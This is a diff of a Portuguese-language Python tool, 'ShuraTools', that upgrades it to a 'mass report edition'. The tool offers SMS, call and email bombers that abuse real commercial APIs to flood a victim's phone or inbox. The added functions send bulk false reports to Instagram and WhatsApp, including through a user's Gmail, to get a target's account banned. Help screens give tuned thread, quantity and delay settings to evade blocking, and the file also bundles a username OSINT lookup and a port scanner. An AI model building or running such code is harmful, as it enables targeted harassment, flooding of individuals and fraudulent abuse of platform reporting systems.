@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ShuraTools v10.0 FINAL PERFECT EDITION
-Todas as ferramentas funcionando + Explicações + Links OSINT
+ShuraTools v11.0 MASS REPORT EDITION
+Baseado em: Instagram-Reports + SpamReport + X_BOMB
 """
 
-import os, sys, time, random, threading, socket
+import os, sys, time, random, threading, socket, smtplib
+from email.mime.text import MIMEText
 from concurrent.futures import ThreadPoolExecutor
 
 try:
@@ -23,8 +24,8 @@ BANNER = f"""
 {Fore.RED}╚════██║██╔══██║██║   ██║██╔══██╗██╔══██║
 {Fore.RED}███████║██║  ██║╚██████╔╝██║  ██║██║  ██║
 {Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
-{Fore.YELLOW}     [ Ultimate Bomber Collection ]
-{Fore.WHITE}  v10.0 FINAL PERFECT EDITION - by Shura
+{Fore.YELLOW}  [ SMS/Call/Email Bomber + Mass Report ]
+{Fore.WHITE}  v11.0 MASS REPORT EDITION - by Shura
 """
 
 LOCK = threading.Lock()
@@ -40,102 +41,86 @@ def safe_int(p, d):
     except: return d
 
 def show_help(mode):
-    """Mostra ajuda detalhada para cada modo"""
     helps = {
         "sms": f"""
 {Fore.CYAN}╔══════════════════════════════════════════════════════════╗
 ║              COMO USAR: SMS BOMBER                       ║
 ╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
-{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
-  → Digite o número com DDI + DDD + Número
-  → Exemplo: {Fore.GREEN}5511999887766{Style.RESET_ALL}
-  → Formato: {Fore.GREEN}55{Style.RESET_ALL} (Brasil) + {Fore.GREEN}11{Style.RESET_ALL} (SP) + {Fore.GREEN}999887766{Style.RESET_ALL}
-
-{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
-  → Quantos SMS você quer enviar
-  → Recomendado: {Fore.GREEN}20-50{Style.RESET_ALL}
-
-{Fore.YELLOW}Threads:{Style.RESET_ALL}
-  → Quantos ataques simultâneos
-  → Recomendado: {Fore.GREEN}5-10{Style.RESET_ALL}
-
-{Fore.YELLOW}Delay:{Style.RESET_ALL}
-  → Segundos entre cada ataque
-  → Recomendado: {Fore.GREEN}2-3{Style.RESET_ALL} (evita bloqueio)
+{Fore.YELLOW}Target:{Style.RESET_ALL} 5511999887766 (DDI+DDD+Número)
+{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 20-50 (recomendado)
+{Fore.YELLOW}Threads:{Style.RESET_ALL} 5-10
+{Fore.YELLOW}Delay:{Style.RESET_ALL} 2-3 segundos
 """,
         "call": f"""
 {Fore.CYAN}╔══════════════════════════════════════════════════════════╗
 ║              COMO USAR: CALL BOMBER                      ║
 ╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
-{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
-  → Mesmo formato do SMS
-  → Exemplo: {Fore.GREEN}5511999887766{Style.RESET_ALL}
-
-{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
-  → Quantas chamadas você quer disparar
-  → Recomendado: {Fore.GREEN}5-15{Style.RESET_ALL} (chamadas são mais pesadas)
-
-{Fore.YELLOW}Threads:{Style.RESET_ALL}
-  → Recomendado: {Fore.GREEN}3-5{Style.RESET_ALL}
-
-{Fore.YELLOW}Delay:{Style.RESET_ALL}
-  → Recomendado: {Fore.GREEN}3-5{Style.RESET_ALL} segundos
+{Fore.YELLOW}Target:{Style.RESET_ALL} 5511999887766
+{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 5-15 (chamadas são pesadas)
+{Fore.YELLOW}Threads:{Style.RESET_ALL} 3-5
+{Fore.YELLOW}Delay:{Style.RESET_ALL} 3-5 segundos
 """,
         "email": f"""
 {Fore.CYAN}╔══════════════════════════════════════════════════════════╗
 ║              COMO USAR: EMAIL BOMBER                     ║
 ╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
-{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
-  → Digite o e-mail completo
-  → Exemplo: {Fore.GREEN}vitima@gmail.com{Style.RESET_ALL}
+{Fore.YELLOW}Target:{Style.RESET_ALL} vitima@gmail.com
+{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 30-50
+{Fore.YELLOW}Delay:{Style.RESET_ALL} 1-2 segundos
+{Fore.RED}IMPORTANTE:{Style.RESET_ALL} E-mails vão para PROMOÇÕES/SPAM!
+""",
+        "ig": f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
+║          COMO USAR: INSTAGRAM MASS REPORT                ║
+╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.YELLOW}Target:{Style.RESET_ALL} Digite o @ do Instagram {Fore.RED}SEM O @{Style.RESET_ALL}
+{Fore.YELLOW}Exemplo:{Style.RESET_ALL} {Fore.GREEN}elonmusk{Style.RESET_ALL} (NÃO @elonmusk)
+{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 50-200 reports
+{Fore.YELLOW}Motivo:{Style.RESET_ALL}
+  1 - Spam
+  2 - Conteúdo Inapropriado
+  3 - Assédio/Bullying
+  4 - Discurso de Ódio
+  5 - Violência
+{Fore.RED}AVISO:{Style.RESET_ALL} Muitos reports podem banir a conta!
+""",
+        "zap": f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
+║          COMO USAR: WHATSAPP MASS REPORT                 ║
+╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+{Fore.YELLOW}Target:{Style.RESET_ALL} 5511999887766 (DDI+DDD+Número)
+{Fore.YELLOW}Quantidade:{Style.RESET_ALL} 20-100 reports
 
-{Fore.YELLOW}Quantidade:{Style.RESET_ALL}
-  → Quantos cadastros em newsletters
-  → Recomendado: {Fore.GREEN}30-50{Style.RESET_ALL}
+{Fore.YELLOW}Método:{Style.RESET_ALL}
+  1 - API Report (rápido)
+  2 - Email Report (efetivo)
 
-{Fore.YELLOW}Threads:{Style.RESET_ALL}
-  → Recomendado: {Fore.GREEN}10{Style.RESET_ALL}
+{Fore.YELLOW}Email Report:{Style.RESET_ALL}
+  → Envia e-mails para support@whatsapp.com
+  → Requer Gmail configurado
+  → Mais efetivo para banimento
 
-{Fore.YELLOW}Delay:{Style.RESET_ALL}
-  → Recomendado: {Fore.GREEN}1-2{Style.RESET_ALL} segundos
-
-{Fore.YELLOW}IMPORTANTE:{Style.RESET_ALL}
-  → E-mails vão para {Fore.RED}PROMOÇÕES{Style.RESET_ALL} ou {Fore.RED}SPAM{Style.RESET_ALL} no Gmail!
+{Fore.RED}AVISO:{Style.RESET_ALL} Email Report requer senha de app do Gmail!
 """,
         "osint": f"""
 {Fore.CYAN}╔══════════════════════════════════════════════════════════╗
 ║              COMO USAR: OSINT HUNTER                     ║
 ╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
-{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
-  → Digite o @ do usuário {Fore.RED}SEM O @{Style.RESET_ALL}
-  → Exemplo: {Fore.GREEN}elonmusk{Style.RESET_ALL}
-  → NÃO digite: {Fore.RED}@elonmusk{Style.RESET_ALL}
-
-{Fore.YELLOW}O que faz:{Style.RESET_ALL}
-  → Busca o usuário em 10 redes sociais
-  → Mostra se o perfil existe
-  → Exibe o link clicável para acessar
+{Fore.YELLOW}Target:{Style.RESET_ALL} elonmusk (SEM @)
+{Fore.YELLOW}Busca em:{Style.RESET_ALL} 10 redes sociais
+{Fore.YELLOW}Mostra:{Style.RESET_ALL} Links clicáveis dos perfis
 """,
         "port": f"""
 {Fore.CYAN}╔══════════════════════════════════════════════════════════╗
 ║              COMO USAR: PORT SCANNER                     ║
 ╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
-{Fore.YELLOW}Target (Alvo):{Style.RESET_ALL}
-  → Digite um IP ou domínio
-  → Exemplos:
-    • IP: {Fore.GREEN}8.8.8.8{Style.RESET_ALL}
-    • Domínio: {Fore.GREEN}google.com{Style.RESET_ALL}
-    • Domínio: {Fore.GREEN}github.com{Style.RESET_ALL}
-
-{Fore.YELLOW}O que faz:{Style.RESET_ALL}
-  → Escaneia 14 portas comuns
-  → Mostra quais estão abertas
-  → Útil para verificar serviços ativos
+{Fore.YELLOW}Target:{Style.RESET_ALL} 8.8.8.8 ou google.com
+{Fore.YELLOW}Escaneia:{Style.RESET_ALL} 14 portas comuns
 """
     }
     print(helps.get(mode, ""))
 
-# ========== BOMBERS DATABASE ==========
+# ========== BOMBERS ==========
 BOMBERS = {
     "sms": [
         {"n": "iFood", "u": "https://marketplace.ifood.com.br/v1/merchants/search/phone-number", "d": {"phoneNumber": "{T}"}, "h": {"Content-Type": "application/json"}},
@@ -158,53 +143,122 @@ BOMBERS = {
     ]
 }
 
-# ========== BOMBER ENGINE ==========
 def bomber(target, mode, qty, threads, delay):
     global stats
     stats = {"success": 0, "fail": 0}
     apis = BOMBERS.get(mode, [])
-    
     log(f"Iniciando {mode.upper()} Bomber", "w")
-    log(f"APIs: {len(apis)} | Target: {target} | Qty: {qty}", "i")
     
     def attack(api, idx):
         try:
-            data = {}
-            for k, v in api["d"].items():
-                data[k] = v.replace("{T}", target) if isinstance(v, str) else v
-            
-            res = requests.post(
-                api["u"],
-                json=data,
-                headers=api["h"],
-                timeout=10
-            )
-            
+            data = {k: v.replace("{T}", target) if isinstance(v, str) else v for k, v in api["d"].items()}
+            res = requests.post(api["u"], json=data, headers=api["h"], timeout=10)
             if res.status_code < 400:
-                with LOCK:
-                    stats["success"] += 1
+                with LOCK: stats["success"] += 1
                 log(f"[{idx+1}/{qty}] {api['n']} → OK", "s")
             else:
-                with LOCK:
-                    stats["fail"] += 1
+                with LOCK: stats["fail"] += 1
                 log(f"[{idx+1}/{qty}] {api['n']} → {res.status_code}", "w")
-            
             time.sleep(delay)
         except:
-            with LOCK:
-                stats["fail"] += 1
+            with LOCK: stats["fail"] += 1
             log(f"[{idx+1}/{qty}] {api['n']} → Timeout", "e")
     
     with ThreadPoolExecutor(max_workers=threads) as exe:
         for i in range(qty):
-            api = random.choice(apis)
-            exe.submit(attack, api, i)
-    
+            exe.submit(attack, random.choice(apis), i)
     log(f"Concluído! ✓ {stats['success']} | ✗ {stats['fail']}", "i")
 
-# ========== OSINT COM LINKS ==========
+# ========== INSTAGRAM MASS REPORT ==========
+def ig_report(username, qty, reason):
+    log(f"Instagram Mass Report: @{username}", "w")
+    
+    reasons = {
+        "1": "spam",
+        "2": "inappropriate",
+        "3": "harassment",
+        "4": "hate_speech",
+        "5": "violence"
+    }
+    
+    reason_id = reasons.get(reason, "spam")
+    
+    def report(idx):
+        try:
+            res = requests.post(
+                "https://i.instagram.com/api/v1/users/web_report/",
+                data={
+                    "username": username,
+                    "source_name": "profile",
+                    "reason_id": reason_id,
+                    "is_spam": "true"
+                },
+                headers={"User-Agent": "Instagram 150.0.0.0 Android"},
+                timeout=5
+            )
+            if res.status_code < 400:
+                log(f"Report {idx+1}/{qty} → OK", "s")
+            else:
+                log(f"Report {idx+1}/{qty} → {res.status_code}", "w")
+        except:
+            log(f"Report {idx+1}/{qty} → Timeout", "e")
+    
+    with ThreadPoolExecutor(max_workers=10) as exe:
+        for i in range(qty):
+            exe.submit(report, i)
+            time.sleep(0.5)
+
+# ========== WHATSAPP MASS REPORT ==========
+def zap_report(phone, qty, method):
+    log(f"WhatsApp Mass Report: {phone}", "w")
+    
+    if method == "1":  # API Report
+        def report(idx):
+            try:
+                res = requests.post(
+                    "https://v.whatsapp.net/v2/report",
+                    data={"phone": phone, "reason": "spam"},
+                    headers={"User-Agent": "WhatsApp/2.21.4.22"},
+                    timeout=5
+                )
+                if res.status_code < 400:
+                    log(f"Report {idx+1}/{qty} → OK", "s")
+                else:
+                    log(f"Report {idx+1}/{qty} → {res.status_code}", "w")
+            except:
+                log(f"Report {idx+1}/{qty} → Timeout", "e")
+        
+        with ThreadPoolExecutor(max_workers=10) as exe:
+            for i in range(qty):
+                exe.submit(report, i)
+                time.sleep(0.5)
+    
+    else:  # Email Report (mais efetivo)
+        log("Email Report requer configuração de Gmail!", "w")
+        gmail = input(f"{Fore.YELLOW}Seu Gmail: {Style.RESET_ALL}").strip()
+        senha = input(f"{Fore.YELLOW}Senha de App: {Style.RESET_ALL}").strip()
+        
+        for i in range(qty):
+            try:
+                msg = MIMEText(f"Reportando número {phone} por spam e violação dos termos.")
+                msg['Subject'] = f"Report Spam - {phone}"
+                msg['From'] = gmail
+                msg['To'] = "support@whatsapp.com"
+                
+                server = smtplib.SMTP('smtp.gmail.com', 587)
+                server.starttls()
+                server.login(gmail, senha)
+                server.send_message(msg)
+                server.quit()
+                
+                log(f"Email Report {i+1}/{qty} → Enviado", "s")
+                time.sleep(2)
+            except:
+                log(f"Email Report {i+1}/{qty} → Falhou", "e")
+
+# ========== OSINT ==========
 def osint(t):
-    log(f"OSINT Hunter: {t}", "w")
+    log(f"OSINT: {t}", "w")
     u = t.replace("@", "")
     platforms = {
         "Instagram": f"https://www.instagram.com/{u}/",
@@ -218,7 +272,6 @@ def osint(t):
         "Twitch": f"https://www.twitch.tv/{u}",
         "Medium": f"https://medium.com/@{u}"
     }
-    
     print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
     for name, url in platforms.items():
         try:
@@ -237,23 +290,15 @@ def portscan(t):
     log(f"Scanning {t}...", "w")
     try:
         ip = socket.gethostbyname(t)
-        log(f"IP Resolvido: {Fore.GREEN}{ip}{Style.RESET_ALL}", "i")
-        
+        log(f"IP: {Fore.GREEN}{ip}{Style.RESET_ALL}", "i")
         print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-        ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]
-        open_ports = []
-        
-        for p in ports:
+        for p in [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 3389, 5432, 8080, 8443]:
             s = socket.socket()
             s.settimeout(0.5)
             if s.connect_ex((ip, p)) == 0:
-                open_ports.append(p)
                 log(f"Port {p} → {Fore.GREEN}OPEN{Style.RESET_ALL}", "s")
             s.close()
-        
-        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-        log(f"Total de portas abertas: {len(open_ports)}", "i")
-        
+        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
     except Exception as e:
         log(f"Erro: {e}", "e")
 
@@ -264,13 +309,14 @@ def menu():
             clear()
             print(BANNER)
             print("-" * 60)
-            print(f"{Fore.RED}[ 1 ] SMS Bomber ({len(BOMBERS['sms'])} APIs)")
-            print(f"{Fore.RED}[ 2 ] Call Bomber ({len(BOMBERS['call'])} APIs)")
-            print(f"{Fore.RED}[ 3 ] Email Bomber ({len(BOMBERS['email'])} APIs)")
-            print(f"{Fore.RED}[ 4 ] Mass Report (IG/Zap)")
+            print(f"{Fore.RED}[ 1 ] SMS Bomber")
+            print(f"{Fore.RED}[ 2 ] Call Bomber")
+            print(f"{Fore.RED}[ 3 ] Email Bomber")
+            print(f"{Fore.RED}[ 4 ] Instagram Mass Report")
+            print(f"{Fore.RED}[ 5 ] WhatsApp Mass Report")
             print("-" * 60)
-            print(f"{Fore.WHITE}[ 5 ] OSINT Hunter (10 plataformas)")
-            print(f"{Fore.WHITE}[ 6 ] Port Scanner (14 portas)")
+            print(f"{Fore.WHITE}[ 6 ] OSINT Hunter")
+            print(f"{Fore.WHITE}[ 7 ] Port Scanner")
             print(f"{Fore.WHITE}[ 0 ] EXIT")
             print("-" * 60)
             
@@ -280,51 +326,45 @@ def menu():
             if opt in ["1", "2", "3"]:
                 mode = {"1": "sms", "2": "call", "3": "email"}[opt]
                 show_help(mode)
-                
                 t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
-                
-                # Validação
                 if mode in ["sms", "call"] and (not t.isdigit() or len(t) < 10):
-                    log("Número inválido! Use formato: 5511999887766", "e")
-                    time.sleep(2)
-                    continue
+                    log("Número inválido!", "e"); time.sleep(2); continue
                 elif mode == "email" and "@" not in t:
-                    log("E-mail inválido! Use formato: vitima@gmail.com", "e")
-                    time.sleep(2)
-                    continue
-                
+                    log("E-mail inválido!", "e"); time.sleep(2); continue
                 qty = safe_int(f"{Fore.YELLOW}Quantidade: {Style.RESET_ALL}", 20)
                 threads = safe_int(f"{Fore.YELLOW}Threads: {Style.RESET_ALL}", 5)
-                delay = safe_int(f"{Fore.YELLOW}Delay (segundos): {Style.RESET_ALL}", 2)
-                
+                delay = safe_int(f"{Fore.YELLOW}Delay: {Style.RESET_ALL}", 2)
                 bomber(t, mode, qty, threads, delay)
             
             elif opt == "4":
-                t = input(f"{Fore.YELLOW}Target (@user ou phone): {Style.RESET_ALL}").strip()
-                tp = input(f"{Fore.YELLOW}App (ig/zap): {Style.RESET_ALL}").lower()
-                url = "https://i.instagram.com/api/v1/users/web_report/" if tp == "ig" else "https://v.whatsapp.net/v2/report"
-                for i in range(safe_int("Qty (50): ", 50)):
-                    try:
-                        requests.post(url, data={"username":t}, timeout=5)
-                        log(f"Report {i+1} sent", "s")
-                    except: pass
+                show_help("ig")
+                t = input(f"{Fore.YELLOW}Target (SEM @): {Style.RESET_ALL}").strip()
+                qty = safe_int(f"{Fore.YELLOW}Quantidade: {Style.RESET_ALL}", 50)
+                reason = input(f"{Fore.YELLOW}Motivo (1-5): {Style.RESET_ALL}").strip()
+                ig_report(t, qty, reason)
             
             elif opt == "5":
-                show_help("osint")
-                t = input(f"{Fore.YELLOW}Target (usuário SEM @): {Style.RESET_ALL}").strip()
-                osint(t)
+                show_help("zap")
+                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                qty = safe_int(f"{Fore.YELLOW}Quantidade: {Style.RESET_ALL}", 20)
+                method = input(f"{Fore.YELLOW}Método (1-API / 2-Email): {Style.RESET_ALL}").strip()
+                zap_report(t, qty, method)
             
             elif opt == "6":
+                show_help("osint")
+                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
+                osint(t)
+            
+            elif opt == "7":
                 show_help("port")
-                t = input(f"{Fore.YELLOW}Target (IP ou domínio): {Style.RESET_ALL}").strip()
+                t = input(f"{Fore.YELLOW}Target: {Style.RESET_ALL}").strip()
                 portscan(t)
             
-            input(f"\n{Fore.GREEN}Pressione ENTER para voltar ao menu...{Style.RESET_ALL}")
+            input(f"\n{Fore.GREEN}ENTER para voltar...{Style.RESET_ALL}")
             
         except KeyboardInterrupt: break
         except Exception as e:
-            log(f"Erro: {e}", "e")
-            input("\nENTER...")
+            log(f"Erro: {e}", "e"); input("\nENTER...")
 
 if __name__ == "__main__":
     menu()
